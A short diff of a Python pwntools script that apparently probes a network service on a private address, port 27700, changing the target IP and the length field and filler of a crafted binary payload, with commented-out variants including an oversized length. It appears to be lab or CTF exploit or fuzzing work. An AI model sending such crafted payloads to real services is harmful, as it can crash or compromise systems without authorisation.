@@ -7,11 +7,11 @@ import pwn
 context.log_level = "debug"
 context.endian = "big"
 
-p = remote("192.168.245.135", 27700)
+p = remote("192.168.245.134", 27700)
 
 # payload = "\xaa\xbb\xff\xff" + p16(0x38) + "\xde" + "a" * 0x37
 
-payload = "\xaa\xbb\xff\xff" + p16(0x38) + "\xde" + "\x00\x64" + "a" * 0x35
+payload = "\xaa\xbb\xff\xff" + p16(0x18) + "\xde" + "\x00\x64" + "a" * 0x15
 #
 # payload = "\xaa\xbb\xff\xff" + p16(0x2bb0) + "\xde" + "\x00\x64" + "a" * (0x2bb0 - 2 - 1)
 
